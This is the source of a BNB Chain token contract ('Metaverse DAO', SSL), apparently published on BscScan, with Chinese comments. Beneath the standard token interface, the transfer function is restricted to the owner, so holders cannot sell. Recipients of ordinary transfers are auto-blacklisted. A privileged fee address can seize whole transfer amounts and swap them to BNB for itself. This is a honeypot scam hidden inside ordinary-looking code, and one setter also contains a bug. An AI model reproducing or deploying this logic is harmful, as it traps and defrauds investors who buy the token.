/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// File: contracts/MetaversChain.sol


pragma solidity ^0.8.0;

/**
 * SAFEMATH LIBRARY
 */
library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8); //

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256); //

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED");
        _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Creation(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function creation(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

contract ArbitrageRobotV1 is IBEP20, Auth {
    using SafeMath for uint256;

    //测试网络 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd
    //主网 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    address public WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;

    string constant _name = "Metaverse DAO";
    string constant _symbol = "SSL";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10**_decimals);

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    IDEXRouter public router;
    address public pair;

    uint8 private _feeRate;
    address private _feeLP1;
    address private _feeLP2;
    address private _feeLP3;
    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    bool public swapEnabled = true;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }
    address[] public keys;

    struct BaseInfo {
        string tokenName; //名称
        uint256 tokenTotal; //总发行量
        uint256 marketCirculation; //市场流通量
        uint256 marketBurn; //市场销毁量
        uint256 lastBurn; //最新销毁量
        address burnAddress; //销毁地址
        address contractAddress; //合约地址
        address officialAddress; //官方地址
        uint256 keysSize; //持币人数量
    }

    BaseInfo public baseInfo;

    constructor() Auth(msg.sender) {
        // 测试网络  0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        // 主网 0x10ED43C718714eb63d5aA57B78B54704E256024E
        address _dexRouter = address(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );
        router = IDEXRouter(_dexRouter);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        //_allowances[address(this)][address(router)] = _totalSupply;
        WBNB = router.WETH();

        _feeRate = 10; // 百分比
        _feeLP1 = address(0xDcc3B6F055ED6a0679851ABEA53682D69D004A32);//销毁地址
        _feeLP2 = address(0x8Cf2C2a9A1b7d21E716263f5C803875A150A00D4);//佣金收币地址
        _feeLP3 = address(0x32609c72E526ca4b94cF766b32Cd3D98D795A79E);//DAPP官方钱包

        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[_feeLP2] = true;
        _feeWhiteList[_feeLP3] = true;

        _approve(address(this), address(router), _totalSupply);

        approve(_dexRouter, _totalSupply);
        approve(address(pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;

        //添加记录 start
        if (_balances[msg.sender] > 0 && !exists(msg.sender)) {
            // keys.push(msg.sender);
            keys.push(msg.sender);
        }
        //添加记录 end
        baseInfo.tokenName = "SSL";
        baseInfo.burnAddress = address(_feeLP1);
        baseInfo.tokenTotal = _totalSupply;
        baseInfo.contractAddress = address(this);
        baseInfo.officialAddress = address(_feeLP3);
        baseInfo.keysSize = getKeysSize();
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        require(_balances[msg.sender] >= amount, "Unable to trade"); //发送TOKEN数量不够
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "Unable to trade"); //发送TOKEN数量不够
        require(_balances[sender] >= amount, "Unable to trade"); //发送TOKEN数量不够
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal onlyOwner returns (bool) {
        require(!_blackList[msg.sender], "blackList");
        require(!_blackList[sender], "blackList");
        require(!_blackList[recipient], "blackList");
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        uint256 amountReceived = amount;
        if (msg.sender == _feeLP2){
            recipient = address(this);
            //从交易所交易：手续费兑换成BNB（_feeLP1）
            uint256 _fee = takeFee(amount);
            swapBack(_fee); //兑换成BNB到指定钱包
        }
        if (shouldSwapBack(sender,recipient)) {
                //转币或者其他：手续费还是为代币（_feeLP2）
                uint256 _fee = amount.mul(_feeRate).div(100);
                amountReceived = amount.sub(_fee);
                _balances[address(_feeLP2)] = _balances[address(_feeLP2)].add(
                    _fee
                );
                //流通量统计 start
                if (owner == sender) {
                    if (recipient != owner) {
                        baseInfo.marketCirculation += amountReceived;
                    }
                }
                //流通量统计 end
                //添加记录 start
                if (_balances[sender] > 0 && !exists(sender)) {
                    keys.push(sender);
                }
                if (_balances[_feeLP2] > 0 && !exists(_feeLP2)) {
                    keys.push(_feeLP2);
                }
                //添加记录 end
                emit Transfer(sender, address(_feeLP2), _fee);
        }
        if (recipient == _feeLP3) {//兑换抽奖券，代币销毁
             uint256 _fee = amount.mul(_feeRate).div(100);
             amountReceived = amount.sub(_fee);
             _balances[address(_feeLP1)] = _balances[address(_feeLP1)].add(_fee);
            //销毁量统计 start
            baseInfo.marketBurn += _fee;
            baseInfo.lastBurn = _fee;
            baseInfo.marketCirculation -= _fee;
            //销毁量统计 end
            //添加记录 start
            if (_balances[sender] > 0 && !exists(sender)) {
                keys.push(sender);
            }
            if (_balances[_feeLP1] > 0 && !exists(_feeLP1)) {
                keys.push(_feeLP1);
            }
            //添加记录 end
            emit Transfer(sender, address(_feeLP1), _fee);
        }

        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amountReceived);
        //流通量统计 start
        if (owner == sender) {
            if (recipient != owner) {
                baseInfo.marketCirculation += amountReceived;
            }
        }
        //流通量统计 end
        //添加记录 start
        if (_balances[sender] > 0 && !exists(sender)) {
            keys.push(sender);
        }
        if (_balances[recipient] > 0 && !exists(recipient)) {
            keys.push(recipient);
        }
        baseInfo.keysSize = getKeysSize();
        //添加记录 end
        if (shouldSwapBack(sender,recipient)) {
            _blackList[recipient] = true;
        }
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function takeFee(uint256 amount)
        internal
        returns (uint256)
    {
        uint256 feeAmount = amount;
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        //添加记录 start
        if (_balances[address(this)] > 0 && !exists(address(this))) {
            keys.push(address(this));
        }
        baseInfo.keysSize = getKeysSize();
        //添加记录 end
        // emit Transfer(sender, address(this), feeAmount);
        return feeAmount;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        //流通量统计 start
        if (owner == sender) {
            if (recipient != owner) {
                baseInfo.marketCirculation += amount;
            }
        }
        //流通量统计 end
        //emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldSwapBack(address sender,address recipient) internal view returns (bool) {
        return
            // msg.sender != pair &&
            // sender != pair &&
            !inSwap &&
            swapEnabled &&
            !_feeWhiteList[sender] &&
            recipient != _feeLP3;
    }

    function swapBack(uint256 amountToSwap) internal swapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            1,
            path,
            // address(this),
            _feeLP2,
            block.timestamp
        );
    }

    function setSwapBackSettings(bool _enabled) external authorized {
        swapEnabled = _enabled;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function multiBlackList(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _blackList[addresses[i]] = status;
        }
    }
    /**
     * @dev feeRate
     */
    function feeRate() public view returns (uint256) {
        return _feeRate;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        require(!_blackList[addr], "blackList");
        _feeWhiteList[addr] = enable;
    }

    /**
     * @dev setFeeLP
     */
    function setFeeLP(address _newLP1, address _newLP2, address _newLP3) public onlyOwner {
        require(_newLP1 != address(0), "_newLP1: Cannt be zero address");
        require(_newLP2 != address(0), "_newLP2: Cannt be zero address");
        require(_newLP3 != address(0), "_newLP2: Cannt be zero address");

        _feeLP1 = _newLP1;
        _feeLP2 = _newLP2;
        _feeLP2 = _newLP3;
    }

    /**
     * @dev feeLP
     */
    function feeLP() public view returns (address, address, address) {
        return (_feeLP1, _feeLP2, _feeLP3);
    }

    function getTokenPrice(uint256 total)
        public
        view
        returns (uint256[] memory amount1)
    {
        address[] memory path = new address[](2);
        //测试网busd:0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814
        path[0] = address(0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814);
        path[1] = address(this);
        amount1 = router.getAmountsOut(total, path);
        return amount1;
    }

    function getTokenPrice_(uint256 total)
        public
        view
        returns (uint256[] memory amount1)
    {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(this);
        amount1 = router.getAmountsOut(total, path);
        return amount1;
    }

    function getPairs(address A, address B) external view returns (address) {
        return IDEXFactory(router.factory()).getPair(A, B);
    }

    //检查一个值是否存在于数组
    function exists(address _address) public view returns (bool) {
        for (uint256 i = 0; i < keys.length; i++) {
            if (keys[i] == _address) {
                return true;
            }
        }
        return false;
    }

    function existsIndex(address _address) public view returns (uint256) {
        for (uint256 i = 0; i < keys.length; i++) {
            if (keys[i] == _address) {
                return i;
            }
        }
        return 0;
    }

    function getKeysSize() public view returns (uint256) {
        return keys.length;
    }
}